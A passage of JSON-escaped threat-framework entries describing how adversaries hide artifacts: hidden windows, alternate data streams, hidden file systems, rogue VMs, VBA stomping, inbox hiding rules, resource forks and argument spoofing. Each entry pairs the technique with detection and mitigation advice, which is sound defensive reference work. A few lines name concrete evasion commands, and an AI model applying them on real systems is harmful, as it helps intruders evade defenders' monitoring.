to adversary activity on the system. <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Antiquated Mac Malware)</a>\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. <a href=\"https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PowerShell About 2019)</a>\n\nThe Windows Registry can also be edited to hide application windows from the current user. For example, by setting the <code>WindowPosition</code> subkey in the <code>HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe</code> Registry key to a maximum value, PowerShell windows will open off screen and be hidden. <a href=\"https://cantoriscomputing.wordpress.com/2016/07/22/powershell-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cantoris Computing)</a>\n\nIn addition, Windows supports the <code>CreateDesktop()</code> API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process. <a href=\"https://www.malwaretech.com/2015/09/hidden-vnc-for-beginners.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hidden VNC)</a> <a href=\"https://securityintelligence.com/anatomy-of-an-hvnc-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anatomy of an hVNC Attack)</a>  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, <a href=\"https://www.malwaretech.com/2015/09/hidden-vnc-for-beginners.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hidden VNC)</a> will be invisible to other desktops windows.\n\nAdversaries may also leverage cmd.exe <a href=\"https://www.cybereason.com/blog/behind-closed-doors-the-rise-of-hidden-malicious-remote-access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason - Hidden Malicious Remote Access)</a> as a parent process, and then utilize a LOLBin, such as DeviceCredentialDeployment.exe, <a href=\"https://lolbas-project.github.io/lolbas/Binaries/DeviceCredentialDeployment/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Project GitHub Device Cred Dep)</a> <a href=\"https://securelist.com/bluenoroff-methods-bypass-motw/108383/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureList BlueNoroff Device Cred Dev)</a> to hide windows.","detection":"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","Command: Command Execution","Process: Process Creation","Script: Script Execution"],"mitigations":[{"id":"M1033","name":"Limit Software Installation","description":"Restrict the installation of software that may be abused to create hidden desktops, such as hVNC, to user groups that require it."},{"id":"M1038","name":"Execution Prevention","description":"Limit or restrict program execution using anti-virus software. On MacOS, allowlist programs that are allowed to have the plist tag. All other programs should be considered suspicious."}]},{"id":"T1564.004","name":"NTFS File Attributes","description":"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. <a href=\"https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Host-Based Jul 2017)</a> Within MFT entries are file attributes, <a href=\"https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft NTFS File Attributes Aug 2010)</a> such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). <a href=\"https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Host-Based Jul 2017)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Streams)</a> <a href=\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes ADS July 2015)</a> <a href=\"https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADS Mar 2014)</a>\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. <a href=\"http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Journey into IR ZeroAccess NTFS EA)</a> <a href=\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes ADS July 2015)</a>","detection":"Forensic techniques exist to identify information stored in NTFS EA. <a href=\"http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Journey into IR ZeroAccess NTFS EA)</a> Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, <a href=\"https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe ADS1 Jan 2018)</a> <a href=\"https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe ADS2 Apr 2018)</a> and consider regularly scanning for the presence of modified information. <a href=\"https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Host-Based Jul 2017)</a>\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. <a href=\"https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADS Mar 2014)</a> <a href=\"https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe ADS1 Jan 2018)</a> <a href=\"https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe ADS2 Apr 2018)</a> For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. <a href=\"https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec ADS May 2009)</a> Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. <a href=\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes ADS July 2015)</a> <a href=\"https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADS Mar 2014)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Modification","Process: Process Creation","File: File Metadata","Process: OS API Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Consider adjusting read and write permissions for NTFS EA, though this should be tested to ensure routine OS operations are not impeded. <a href=\"https://blog.stealthbits.com/attack-step-3-persistence-ntfs-extended-attributes-file-system-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: InsiderThreat NTFS EA Oct 2017)</a>"}]},{"id":"T1564.005","name":"Hidden File System","description":"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS. <a href=\"https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareTech VFS Nov 2014)</a>\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. <a href=\"https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareTech VFS Nov 2014)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Bootkits)</a> Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET ComRAT May 2020)</a> Adversaries may also fragment files across the existing file system structure in non-standard ways. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Equation QA)</a>","detection":"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting Bootkit activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Firmware: Firmware Modification","File: File Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1564.006","name":"Run Virtual Instance","description":"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. <a href=\"https://cybercx.com.au/blog/akira-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberCX Akira Ransomware)</a> Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values. <a href=\"https://www.mci.gov.sg/-/media/mcicorp/doc/report-of-the-coi-into-the-cyber-attack-on-singhealth-10-jan-2019.ashx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SingHealth Breach Jan 2019)</a>\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V), deploy lightweight emulators (ex: QEMU), or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). <a href=\"https://www.securonix.com/blog/crontrap-emulated-linux-environments-as-the-latest-tactic-in-malware-staging/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securonix CronTrap 2024)</a> After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system. <a href=\"https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Ragnar May 2020)</a>\n\nThreat actors may also leverage temporary virtualized environments such as the Windows Sandbox, which supports the use of <code>.wsb</code> configuration files for defining execution parameters. For example, the <code>&lt;MappedFolder&gt;</code> property supports the creation of a shared folder, while the <code>&lt;LogonCommand&gt;</code> property allows the specification of a payload. <a href=\"https://www.welivesecurity.com/en/eset-research/operation-akairyu-mirrorface-invites-europe-expo-2025-revives-anel-backdoor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET MirrorFace 2025)</a> <a href=\"https://blog-en.itochuci.co.jp/entry/2025/03/12/140000\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITOCHU Hack the Sandbox)</a> <a href=\"https://jsac.jpcert.or.jp/archive/2025/pdf/JSAC2025_2_9_kamekawa_sasada_niwa_en.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITOCHU Sandbox PPT)</a>\n\nIn VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid <code>.vmx</code> file with the <code>/bin/vmx</code> utility. Adding this command to <code>/etc/rc.local.d/local.sh</code> (i.e., RC Scripts) will cause the VM to persistently restart. <a href=\"https://vninja.net/2024/11/11/beware-of-the-rogue-vms/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: vNinja Rogue VMs 2024)</a> Creating a VM this way prevents it from appearing in the vCenter console or in the output to the <code>vim-cmd vmsvc/getallvms</code> command on the ESXi server, thereby hiding it from typical administrative activities. <a href=\"https://medium.com/mitre-engenuity/infiltrating-defenses-abusing-vmware-in-mitres-cyber-intrusion-4ea647b83f5b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE VMware Abuse 2024)</a>","detection":"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines. <a href=\"https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Shadowbunny VM Defense Evasion)</a> Network adapter information may also be helpful in detecting the use of virtual instances.\n\nConsider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>). <a href=\"https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Shadowbunny VM Defense Evasion)</a> Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages \"all\"</code>).\n\nMonitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for Windows Service, with respect to virtualization software. \n\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Image: Image Metadata","Service: Service Creation","Process: Process Creation","File: File Creation","Command: Command Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control to mitigate installation and use of unapproved virtualization software."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable native virtualization technologies such as Hyper-V if not necessary within a given environment. Consider also disabling Windows Sandbox if it is not needed to test or debug applications."},{"id":"M1047","name":"Audit","description":"Periodically audit virtual machines for abnormalities. On ESXi servers, periodically compare the output of <code>vim-cmd vmsvc/getallvms</code>, which lists all VMs in vCenter, and <code>escxli vm process list | grep Display</code>, which lists all VMs hosted on ESXi. <a href=\"https://medium.com/mitre-engenuity/infiltrating-defenses-abusing-vmware-in-mitres-cyber-intrusion-4ea647b83f5b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE VMware Abuse 2024)</a>"}]},{"id":"T1564.007","name":"VBA Stomping","description":"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data. <a href=\"https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye VBA stomp Feb 2020)</a>\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application. <a href=\"https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Evil Clippy May 2019)</a> <a href=\"https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft _VBA_PROJECT Stream)</a>\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis. <a href=\"https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Walmart Roberts Oct 2018)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye VBA stomp Feb 2020)</a> <a href=\"https://github.com/bontchev/pcodedmp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: pcodedmp Bontchev)</a>","detection":"Detection efforts should be placed finding differences between VBA source code and p-code. <a href=\"https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Walmart Roberts Oct 2018)</a> VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code. <a href=\"https://github.com/bontchev/pcodedmp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: pcodedmp Bontchev)</a> <a href=\"https://github.com/decalage2/oletools\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: oletools toolkit)</a>\n\nIf the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the <code>PROJECT</code> stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the <code>PROJECT</code> stream will inhibit attempts of reading the VBA source code through the GUI. <a href=\"https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye VBA stomp Feb 2020)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata","Script: Script Execution"],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Turn off or restrict access to unneeded VB components. <a href=\"https://docs.microsoft.com/en-us/previous-versions/office/troubleshoot/office-developer/turn-off-visual-basic-for-application\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable VBA Jan 2020)</a>"}]},{"id":"T1564.008","name":"Email Hiding Rules","description":"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> PowerShell cmdlets on Windows systems. <a href=\"https://support.microsoft.com/en-us/office/manage-email-messages-by-using-rules-c24f5dea-9465-4df4-ad17-a50704d66c59\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Inbox Rules)</a> <a href=\"https://support.apple.com/guide/mail/use-rules-to-manage-emails-you-receive-mlhlp1017/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MacOS Email Rules)</a> <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/new-inboxrule?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft New-InboxRule)</a> <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/set-inboxrule?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Set-InboxRule)</a>\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. <a href=\"https://techcommunity.microsoft.com/t5/security-compliance-and-identity/rule-your-inbox-with-microsoft-cloud-app-security/ba-p/299154\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Cloud App Security)</a>\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. <a href=\"https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Mail Flow Rules 2023)</a> Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).","detection":"Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.\n\nOn Windows systems, monitor for creation of suspicious inbox rules through the use of the <code>New-InboxRule</code> and <code>Set-InboxRule</code> PowerShell cmdlets. <a href=\"https://www.microsoft.com/security/blog/2021/06/14/behind-the-scenes-of-business-email-compromise-using-cross-domain-threat-data-to-disrupt-a-large-bec-infrastructure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BEC Campaign)</a> On MacOS systems, monitor for modifications to the <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, and <code>MessageRules.plist</code> files. <a href=\"https://support.apple.com/guide/mail/use-rules-to-manage-emails-you-receive-mlhlp1017/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MacOS Email Rules)</a>","platforms":["Windows","Linux","macOS","Office Suite"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","File: File Modification"],"mitigations":[{"id":"M1047","name":"Audit","description":"Enterprise email solutions may have monitoring mechanisms that may include the ability to audit inbox rules on a regular basis. \n\nIn an Exchange environment, Administrators can use <code>Get-InboxRule</code> / <code>Remove-InboxRule</code> and <code>Get-TransportRule</code> / <code>Remove-TransportRule</code> to discover and remove potentially malicious inbox and transport rules. <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/get-inboxrule?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Get-InboxRule)</a> <a href=\"https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/manage-mail-flow-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Manage Mail Flow Rules 2023)</a>"}]},{"id":"T1564.009","name":"Resource Forking","description":"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. <a href=\"http://tenon.com/products/codebuilder/User_Guide/6_File_Systems.html#anchor520553\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS Hierarchical File System Overview)</a> Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder. <a href=\"https://flylib.com/books/en/4.395.1.192/1/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Resource and Data Forks)</a> <a href=\"https://eclecticlight.co/2020/10/24/theres-more-to-files-than-data-extended-attributes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ELC Extended Attributes)</a>\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution. <a href=\"https://www.sentinelone.com/labs/resourceful-macos-malware-hides-in-named-fork/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinellabs resource named fork 2020)</a> <a href=\"https://blogs.vmware.com/security/2020/06/tau-threat-analysis-bundlore-macos-mm-install-macos.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: tau bundlore erika noerenberg 2020)</a>","detection":"Identify files with the <code>com.apple.ResourceFork</code> extended attribute and large data amounts stored in resource forks. \n\nMonitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections.","platforms":["macOS"],"dataSources":["File: File Metadata","Process: Process Creation","Command: Command Execution","File: File Creation"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Configure applications to use the application bundle structure which leverages the <code>/Resources</code> folder location. <a href=\"https://support.apple.com/guide/security/app-security-overview-sec35dd877d0/1/web/1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple App Security Overview)</a>"}]},{"id":"T1564.010","name":"Process Argument Spoofing","description":"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PEB 2021)</a> <a href=\"https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Xpn Argue Like Cobalt 2019)</a>\n\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments. <a href=\"https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cobalt Strike Arguments 2019)</a> <a href=\"https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Xpn Argue Like Cobalt 2019)</a> <a href=\"https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nviso Spoof Command Line 2020)</a>\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis. <a href=\"https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye FiveHands April 2021)</a>\n\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.","detection":"Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for Process Hollowing, which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls. <a href=\"https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nviso Spoof Command Line 2020)</a> <a href=\"https://www.mandiant.com/resources/staying-hidden-on-the-endpoint-evading-detection-with-shellcode\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Endpoint Evading 2019)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.","platforms":["Windows"],"dataSources":["Process: Process Creation"],"mitigations":[]},{"id":"T1564.011","name":"Ignore Process Interrupts","description":"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off. <a href=\"https://man7.org/linux/man-pages/man7/signal.7.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 